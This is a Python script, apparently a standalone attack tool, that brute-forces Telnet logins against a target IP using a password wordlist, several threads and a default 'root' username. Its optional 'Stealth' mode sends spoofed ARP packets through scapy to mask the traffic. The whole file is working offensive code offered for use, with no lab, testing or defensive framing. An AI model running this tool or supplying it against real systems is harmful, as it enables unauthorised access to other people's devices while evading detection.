import telnetlib
import threading
import time
import os
import random
import ipaddress
from scapy.all import ARP, send
from datetime import datetime

# Colors
RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

# Shared state
attempts = 0
stopAttack = False
lock = threading.Lock()

class TelnetBruteForce(threading.Thread):
    def __init__(self, target_ip, port, username, passwords, delay, mode, interface):
        super().__init__()
        self.target_ip = target_ip
        self.port = port
        self.username = username
        self.passwords = passwords
        self.delay = delay
        self.mode = mode
        self.interface = interface

    def spoof_arp(self):
        spoof_ip = str(ipaddress.IPv4Address(int(ipaddress.IPv4Address(self.target_ip)) ^ random.randint(1, 254)))
        arp = ARP(op=1, psrc=spoof_ip, pdst=self.target_ip)
        send(arp, verbose=0, iface=self.interface)

    def run(self):
        global attempts, stopAttack

        print(f"[DEBUG] Thread {threading.current_thread().name} started.")

        for password in self.passwords:
            if stopAttack:
                return

            with lock:
                attempts += 1

            password = password.strip()
            print(f"[DEBUG] Trying {self.username}:{password}")

            try:
                if self.mode == 2:
                    self.spoof_arp()

                tn = telnetlib.Telnet(self.target_ip, self.port, timeout=3)
                tn.read_until(b"login: ")
                tn.write(self.username.encode('ascii') + b"\n")
                tn.read_until(b"Password: ")
                tn.write(password.encode('ascii') + b"\n")
                time.sleep(1)
                output = tn.read_very_eager().decode('ascii')

                if "incorrect" not in output.lower():
                    print(f"{GREEN}Success: {self.username}:{password}{RESET}")
                    stopAttack = True
                    tn.close()
                    return
                tn.close()
            except Exception as e:
                print(f"[DEBUG] Error with {password}: {e}")
                continue

            time.sleep(self.delay)

def main():
    global stopAttack

    target_ip = input("Target IP: ").strip()
    port = int(input("Port [23]: ") or 23)
    username = input("Username [root]: ") or "root"
    threads_count = int(input("Threads [10]: ") or 10)
    delay = float(input("Delay between attempts (s) [1.0]: ") or 1.0)

    print(f"{RED}Mode: [1] Normal [2] Stealth (ARP spoof){RESET}")
    mode = int(input("Select mode: ").strip())

    interface = "enp0s3"
    if mode == 2:
        interface = input("Interface for ARP spoof (e.g., eth0): ").strip()

    if not os.path.exists("passwords.txt"):
        print("passwords.txt not found!")
        return

    with open("passwords.txt", "r") as f:
        passwords = f.readlines()

    if not passwords:
        print("No passwords found in passwords.txt!")
        return

    print(f"[DEBUG] Loaded {len(passwords)} passwords from file.")

    start_time = datetime.now()
    print(f"{RED}Attempts: 0/{len(passwords)} | Duration: 00:00:00{RESET}")

    chunk_size = len(passwords) // threads_count
    threads = []

    for i in range(threads_count):
        chunk = passwords[i * chunk_size: (i + 1) * chunk_size] if i != threads_count - 1 else passwords[i * chunk_size:]
        t = TelnetBruteForce(target_ip, port, username, chunk, delay, mode, interface)
        t.start()
        threads.append(t)

    try:
        while any(t.is_alive() for t in threads):
            elapsed = datetime.now() - start_time
            with lock:
                print(f"\r{RED}Attempts: {attempts}/{len(passwords)} | Duration: {str(elapsed).split('.')[0]}{RESET}", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nInterrupted by user. Stopping threads...")
        stopAttack = True

    for t in threads:
        t.join()

    elapsed = datetime.now() - start_time
    print(f"\n{RED}Attack complete. Total attempts: {attempts} | Duration: {str(elapsed).split('.')[0]}{RESET}")

if __name__ == "__main__":
    main()
